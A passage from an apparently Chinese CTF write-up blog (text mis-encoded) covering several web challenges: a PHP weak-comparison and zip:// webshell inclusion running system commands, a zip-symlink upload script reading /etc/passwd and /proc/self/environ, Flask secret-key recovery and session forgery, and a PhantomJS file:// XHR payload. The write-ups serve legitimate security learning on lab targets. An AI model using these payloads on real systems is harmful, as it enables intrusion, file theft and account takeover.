<h2 id="å½©ç¥¨ä¸­å¿ƒ"><a href="#å½©ç¥¨ä¸­å¿ƒ" class="headerlink" title="å½©ç¥¨ä¸­å¿ƒ"></a>å½©ç¥¨ä¸­å¿ƒ</h2><h3 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>phpå¼±ç±»å‹æ¯”è¾ƒç»•è¿‡</li>
<li>jsonæ•°æ®</li>
<li>æ–‡ä»¶åŒ…å«</li>
<li>zipä¼ªåè®®</li>
<li>linux findå‘½ä»¤</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-4"><a href="#è§£é¢˜æ­¥éª¤-4" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>æ ¹æ®æç¤ºç›´æ¥æŠ“å–ä¹°å½©ç¥¨çš„åŒ…ï¼Œçœ‹ä¸€ä¸‹æ•°æ®æ ¼å¼ï¼Œæ˜¯jsonçš„ï¼Œè¿™ä¸ªè·Ÿä¹‹å‰é‡åˆ°è¿‡çš„é¢˜å¾ˆåƒï¼Œ7ä¸ªæ•°å­—å¯¹ä¸Šçš„å°±å¥–åŠ±é’±ï¼Œä¿®æ”¹ä¸€ä¸‹å‘é€çš„æ•°æ®ï¼Œè¿™é‡Œç”¨åˆ°å¼±ç±»å‹ï¼Œæµ‹è¯•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$number=<span class="string">'1234567'</span>;</span><br><span class="line">$target=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="keyword">true</span>,<span class="number">2</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">var_dump($target[<span class="number">1</span>]==$number[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/15/DASfinaltest/11.png" class="">

<p>å¯ä»¥çœ‹åˆ°ç»“æœï¼Œå…¶å®å°±æ˜¯æ— è®ºæ•°å­—è¿˜æ˜¯å­—æ¯å’Œtrueä½œæ¯”è¾ƒè¿”å›çš„æ°¸è¿œæ˜¯trueï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ä¸€ç›´åˆ·å–é‡‘é’±ï¼Œåœ¨è¿™ä¹‹åä¼šå‘ç°é’±ä¸å¤Ÿä¹°flagï¼Œåªèƒ½ä¹°hintï¼Œè¿™é‡Œå‰ç«¯jsæ²¡æœ‰å“åº”ï¼ŒçŒœæµ‹è¿™é‡Œå’Œå‰é¢ä¹°å½©ç¥¨ä¸€æ ·çš„æ–¹æ³•ï¼ŒæŠŠactionçš„å€¼æ”¹ä¸ºhintåº”è¯¥å°±å¯ä»¥äº†</p>
<img src="/2020/08/15/DASfinaltest/12.png" class="">

<p>å½“ç„¶ä¹Ÿå¯ä»¥æ‰¾åˆ°è´­ä¹°hintçš„jsä»£ç ï¼Œåœ¨å‰ç«¯ç›´æ¥è¿è¡Œæ‹¿åˆ°adminçš„å¯†ç </p>
<p>æ³¨å†Œç™»å½•ï¼Œä¼šå‘ç°æƒé™å˜ä¸ºäº†è¶…çº§ç®¡ç†å‘˜ï¼Œè¿˜å¤šäº†ä¸ªé»‘äº§è´¦æˆ·ä¿¡æ¯å¤„ç†é¡µé¢</p>
<img src="/2020/08/15/DASfinaltest/14.png" class="">

<p>åœ¨é»‘äº§è´¦æˆ·ä¿¡æ¯å¤„ç†é¡µé¢å¯ä»¥ä¸Šä¼ docxæ–‡ä»¶ï¼Œè¿™æœ¬èº«å°±æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶ï¼ŒçŒœæµ‹å¯ä»¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç”±äºä¸Šä¼ çš„æ˜¯å‹ç¼©åŒ…æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥å¯ä»¥åˆ©ç”¨zip://ä¼ªåè®®è¿›è¡ŒåŒ…å«shell</p>
<img src="/2020/08/15/DASfinaltest/13.png" class="">

<p>å°†æ–‡ä»¶ä¸Šä¼ ï¼Œä¼ªåè®®åŒ…å«</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6ce5cdd6b7d89172f662e7b7bf0c08a09be20e47.docx%23aaa&amp;a&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<img src="/2020/08/15/DASfinaltest/15.png" class="">

<p>ä¸‹é¢å°±æ˜¯è¦æ‰¾åˆ°flagäº†ï¼Œç”¨findå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6ce5cdd6b7d89172f662e7b7bf0c08a09be20e47.docx%23aaa&amp;a&#x3D;system(&#39;find &#x2F; -name flag&#39;);</span><br></pre></td></tr></table></figure>

<img src="/2020/08/15/DASfinaltest/16.png" class="">

<p>æ‰¾åˆ°ä¹‹åæ‹¿åˆ°flag</p>
<img src="/2020/08/15/DASfinaltest/17.png" class="">]]></content>
      <tags>
        <tag>DAS</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF-2018-Hideandseek</title>
    <url>/2020/07/22/HCTF-2018-Hideandseek/</url>
    <content><![CDATA[<p>æœ€è¿‘åšçš„é¢˜å‘ç°å¯¹äºlinuxæ•´ä¸ªç³»ç»Ÿæ¶æ„çš„è¦æ±‚æ¯”è¾ƒé«˜ï¼Œå¾—æŠ½æ—¶é—´å¥½å¥½å­¦ä¹ ä¸€ä¸‹äº†<a id="more"></a></p>
<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul>
<li><strong>flask-cookieä¼ªé€ sessionï¼ŒåŠ è§£å¯†</strong></li>
<li><strong>zipè½¯é“¾æ¥æ„é€ ä»»æ„æ–‡ä»¶è¯»å–</strong></li>
<li><strong>ä¼ªéšæœºç§å­ç ´è§£</strong></li>
<li><strong>linuxç³»ç»Ÿç›®å½•çš„ç†Ÿæ‚‰</strong></li>
</ul>
<h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>å¼€é¢˜ï¼Œadminä¸èƒ½ç™»å½•ï¼Œä»»æ„å†™ä¸€ä¸ªè´¦å·å¯†ç ç™»å½•è·³è½¬åˆ°ä¸Šä¼ ç•Œé¢ï¼Œè¦æ±‚ä¸Šä¼ zipæ–‡ä»¶</p>
<img src="/2020/07/22/HCTF-2018-Hideandseek/1.png" class="">

<p>éšä¾¿å‹ç¼©ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå…¶ä¸­å†…å®¹ä¸ºpeguin</p>
<img src="/2020/07/22/HCTF-2018-Hideandseek/2.png" class="">

<p>å¯ä»¥å‘ç°åå°åº”è¯¥æ˜¯å¯¹ä¸Šä¼ çš„å‹ç¼©æ–‡ä»¶è¿›è¡Œäº†è§£å‹ç¼©å’Œæ–‡ä»¶çš„è¯»å–</p>
<p>æŸ¥æ‰¾ä¸€ä¸‹èµ„æ–™ï¼Œæ‰¾åˆ°ä¸€ç¯‡blog<a href="https://www.cnblogs.com/Silkage/p/13218598.html" target="_blank" rel="noopener">https://www.cnblogs.com/Silkage/p/13218598.html</a></p>
<p>ä¸»è¦è®²è§£äº†æœ‰å…³zipè½¯é“¾æ¥çš„ç”¨æ³•ï¼Œå€Ÿç”¨æ–‡ä¸­çš„çŸ¥è¯†æˆ‘ä»¬è¿›è¡Œä¸€ä¸‹æ„é€ ï¼Œè¯»å–ä¸€ä¸‹ç›®æ ‡æœåŠ¡å™¨çš„/etc/passwdä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">ç”Ÿæˆä¸€ä¸ªæŒ‡å‘&#x2F;etc&#x2F;passwdæ–‡ä»¶çš„è½¯é“¾æ¥</span><br><span class="line">zip -y passwd.zip passwd</span><br><span class="line">å°†è½¯é“¾æ¥è¿›è¡Œå‹ç¼©</span><br></pre></td></tr></table></figure>

<img src="/2020/07/22/HCTF-2018-Hideandseek/3.png" class="">

<p>è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹æ‰¾æ¥çš„ç”Ÿæˆè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">'http://9ca78698-fdea-4321-8dbc-6ee2e38b1de3.node3.buuoj.cn/upload'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makezip</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">'ln -s '</span>+sys.argv[<span class="number">1</span>]+<span class="string">' exp'</span>)</span><br><span class="line">    os.system(<span class="string">'zip --symlinks exp.zip exp'</span>)</span><br><span class="line">makezip()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'the_file'</span>:open(<span class="string">'./exp.zip'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.post(url,files=files)</span><br><span class="line">    print(res.text)</span><br><span class="line">exploit()</span><br><span class="line">os.system(<span class="string">'rm -rf exp'</span>)</span><br><span class="line">os.system(<span class="string">'rm -rf exp.zip'</span>)</span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡è¯»å–ç›®æ ‡è·¯å¾„åªéœ€ä¸€ä¸‹å‘½ä»¤å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python exp.py &#x2F;xxx&#x2F;xxx&#x2F;xxx</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æ—¶æŠ“ä¸ªåŒ…ï¼Œæœ‰æ‰€å‘ç°</p>
<img src="/2020/07/22/HCTF-2018-Hideandseek/4.png" class="">

<p>sessionå€¼å¾ˆç†Ÿæ‚‰ï¼Œä¸æ˜¯jwtå°±æ˜¯flask sessionï¼Œæ ¹æ®äºŒè€…ä¹‹é—´çš„å·®å¼‚ï¼Œåº”è¯¥å±äºåè€…</p>
<p>ç”¨è„šæœ¬è§£å¯†ä¸€ä¸‹çœ‹çœ‹å­˜å‚¨çš„æ˜¯ä»€ä¹ˆ</p>
<img src="/2020/07/22/HCTF-2018-Hideandseek/5.png" class="">

<p>å¯ä»¥çœ‹åˆ°å­˜å‚¨çš„æ˜¯åˆšåˆšç™»å½•æ—¶å€™çš„ç”¨æˆ·åï¼Œè”æƒ³åˆ°åˆšæ‰adminè´¦æˆ·æ— æ³•ç™»å½•ï¼Œåº”è¯¥æ˜¯å·²ç»æ³¨å†Œäº†ï¼Œé‚£å°±éœ€è¦ä¼ªé€ flask sessionï¼Œé‚£ä¹ˆå°±è¦æ‹¿åˆ°secret key</p>
<p>è¿™é‡Œå°±æ˜¯æ–°æ¥è§¦çš„çŸ¥è¯†å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;procæ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œ</span><br><span class="line">ç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚</span><br><span class="line">environæ˜¯ â€” å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œselfå¯ä»¥æ›¿æ¢æˆè¿›ç¨‹å·ã€‚</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ç¯‡æœ‰å…³/procç›®å½•è®²è§£çš„æ–‡ç« <a href="https://www.cnblogs.com/DswCnblog/p/5780389.html" target="_blank" rel="noopener">https://www.cnblogs.com/DswCnblog/p/5780389.html</a></p>
<p>è¯»å–/proc/self/environ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HOSTNAME&#x3D;04c86f855cc2</span><br><span class="line">SHLVL&#x3D;1</span><br><span class="line">PYTHON_PIP_VERSION&#x3D;19.1.1</span><br><span class="line">HOME&#x3D;&#x2F;root</span><br><span class="line">GPG_KEY&#x3D;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI&#x3D;&#x2F;app&#x2F;uwsgi.ini</span><br><span class="line">WERKZEUG_SERVER_FD&#x3D;3</span><br><span class="line">NGINX_MAX_UPLOAD&#x3D;0UWSGI_PROCESSES&#x3D;16</span><br><span class="line">STATIC_URL&#x3D;&#x2F;static_&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python</span><br><span class="line">UWSGI_CHEAPER&#x3D;2</span><br><span class="line">WERKZEUG_RUN_MAIN&#x3D;true</span><br><span class="line">NGINX_VERSION&#x3D;1.15.81~</span><br><span class="line">stretchPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">NJS_VERSION&#x3D;1.15.8.0.2.7-1~</span><br><span class="line">stretchLANG&#x3D;C.UTF8</span><br><span class="line">PYTHON_VERSION&#x3D;3.6.8</span><br><span class="line">NGINX_WORKER_PROCESSES&#x3D;1</span><br><span class="line">LISTEN_PORT&#x3D;80</span><br><span class="line">STATIC_INDEX&#x3D;0</span><br><span class="line">PWD&#x3D;&#x2F;app</span><br><span class="line">PYTHONPATH&#x3D;&#x2F;app</span><br><span class="line">STATIC_PATH&#x3D;&#x2F;app&#x2F;staticF</span><br><span class="line">LAG&#x3D;not_flag</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ³¨æ„åˆ°æœ‰<code>/app/uwsgi.ini</code>æ–‡ä»¶ï¼Œè¯»å–ä¸€ä¸‹å†…å®¹</p>
<img src="/2020/07/22/HCTF-2018-Hideandseek/6.png" class="">

<p>è¿™é‡Œå¥½åƒæœ‰ç‚¹å°é—®é¢˜ï¼Œ/app/main.pyå¹¶ä¸èƒ½è¯»åˆ°æºç ï¼Œçœ‹wpï¼Œåº”è¯¥æ˜¯buuç¯å¢ƒé—®é¢˜ï¼ŒåŸé¢˜çš„æ–‡ä»¶è·¯å¾„è¿˜æ˜¯èƒ½å¤Ÿè®¿é—®å¹¶è¯»å–æ–‡ä»¶çš„ï¼Œè·¯å¾„ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure>

<p>ä»ä»£ç ä¸­æ‰¾åˆ°å…³é”®ç‚¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€è¡Œä»£ç å¾ˆçœ¼ç†Ÿï¼ŒåŸæ¥ç§å­ç”¨çš„æ˜¯macåœ°å€ï¼Œåœ¨<code>/sys/class/net/eth0/address</code>ä¸‹å°±èƒ½çœ‹åˆ°</p>
<img src="/2020/07/22/HCTF-2018-Hideandseek/7.png" class="">

<p>ç”Ÿæˆä¸€ä¸‹secret</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">"02:42:ae:02:67:f4"</span></span><br><span class="line">temp = mac.split(<span class="string">':'</span>)</span><br><span class="line">temp = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [bin(i).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">''</span>.join(temp)</span><br><span class="line">mac = int(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = str(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br><span class="line"><span class="comment">#53.15748623365909</span></span><br></pre></td></tr></table></figure>

<img src="/2020/07/22/HCTF-2018-Hideandseek/9.png" class="">

<p>ç„¶åæ›¿æ¢ä¸€ä¸‹adminçš„cookieï¼Œå°±å¯ä»¥äº†</p>
<img src="/2020/07/22/HCTF-2018-Hideandseek/8.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>FireshellCTF2020</title>
    <url>/2020/07/13/FireshellCTF2020/</url>
    <content><![CDATA[<h3 id="Caas"><a href="#Caas" class="headerlink" title="Caas"></a>Caas<a id="more"></a></h3><img src="/2020/07/13/FireshellCTF2020/1.png" class="">

<p>æ‰“å¼€æ˜¯ä¸ªc/c++çš„ç¼–è¯‘å™¨ï¼Œå†™äº†ä¸€æ®µæ‰“å°helloworldçš„ä»£ç ï¼Œå¥½åƒæ²¡æœ‰é”™è¯¯å°±ä¼šä¸‹è½½åŒ…å«è¿™æ®µä»£ç çš„æ–‡ä»¶ï¼Œä½†æ˜¯å¯¹åšè¿™é“é¢˜æ²¡å•¥å¸®åŠ©</p>
<p>æ‰«äº†ç›®å½•å•¥éƒ½æ²¡æœ‰ï¼ŒæŠ“åŒ…ä¹Ÿæ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯</p>
<p>è¿™æ—¶çœ‹åˆ°äº†cè¯­è¨€çš„å¤´æ–‡ä»¶ï¼Œprintféœ€è¦å¤´æ–‡ä»¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œè¿™é‡Œçš„includeèƒ½ä¸èƒ½ç›´æ¥åŒ…å«flagå‘¢ï¼Œå…ˆè¯•ä¸€ä¸‹åªæœ‰#include&lt;stdio.h&gt;,æŠ¥é”™äº†</p>
<img src="/2020/07/13/FireshellCTF2020/2.png" class="">

<p>ä¹Ÿè®¸å¯ä»¥ç”¨æŠ¥é”™çš„å½¢å¼åŒ…å«flagæ–‡ä»¶æŠŠflagå¸¦å‡ºæ¥ï¼Œè¯•è¯•#include&lt;/flag&gt;</p>
<p>ä¸è¡Œï¼Œå¯èƒ½ä¸ç”¨å°–æ‹¬å·åŒ…è£¹ï¼Œåº”è¯¥è¦ç”¨å¼•å·</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include"/flag"</span></span><br></pre></td></tr></table></figure>

<img src="/2020/07/13/FireshellCTF2020/3.png" class="">

<p>æ‹¿åˆ°flagï¼Œè¿™é‡Œè¦æ³¨æ„è¦ç”¨åŒå¼•å·åŒ…è£¹ï¼Œå•å¼•å·è¡Œä¸é€š</p>
<h3 id="ScreenShooter"><a href="#ScreenShooter" class="headerlink" title="ScreenShooter"></a>ScreenShooter</h3><p>è¾“å…¥urlï¼Œå¾—åˆ°åé¦ˆä¿¡æ¯çš„å›¾ç‰‡</p>
<p>åˆšå¼€å§‹å¿˜è®°äº†buuä¸é€šå¤–ç½‘ï¼Œç”¨è‡ªå·±çš„vpsæ‰“äº†ä¸¤ä¸ªå°æ—¶æ‰“ä¸é€šï¼Œè‡ªé—­äº†éƒ½ã€‚ã€‚ã€‚</p>
<p>åæ¥æƒ³èµ·æ¥äº†ï¼Œé‚£å°±ç»§ç»­å§</p>
<p>ç”¨requestbinæ¥çœ‹ä¸€ä¸‹è¯·æ±‚,çœ‹åˆ°äº†PhantomJS/2.1.1</p>
<img src="/2020/07/13/FireshellCTF2020/5.png" class="">

<p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/" target="_blank" rel="noopener">https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/</a></p>
<p>è¿™ç¯‡æ–‡ç« å¯¹äºè¿™é“é¢˜çš„æ´è®²è§£çš„å¾ˆè¯¦ç»†ï¼Œå°±æ˜¯é€šè¿‡<code>file://</code>åŠ è½½çš„æ–‡ä»¶è¢«è®¤ä¸ºæ˜¯ç¬¦åˆSame Origin Policyçš„åŒæºæ–‡ä»¶</p>
<p>buuä¸Šå¼€ä¸ªå†…ç½‘é¶æœºï¼Œç”¨ä¸Šæ–‡ç« é‡Œçš„payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®ä¸€ä¸‹åœ°å€</p>
<img src="/2020/07/13/FireshellCTF2020/4.png" class="">

<h3 id="URL-TO-PDF"><a href="#URL-TO-PDF" class="headerlink" title="URL TO PDF"></a>URL TO PDF</h3><p>è®¿é—®urlä¼šå½¢æˆpdfæ–‡ä»¶å¹¶ä¸”ä¸‹è½½</p>
<p>ç”¨requestbinæ¥çœ‹ä¸€ä¸‹è¯·æ±‚</p>
<img src="/2020/07/13/FireshellCTF2020/6.png" class="">

<p>å‘ç°ä½¿ç”¨äº†WeasyPrintï¼ŒæŸ¥ä¸€ä¸‹èµ„æ–™æœ‰å…³WeasyPrintçš„è¯´æ˜</p>
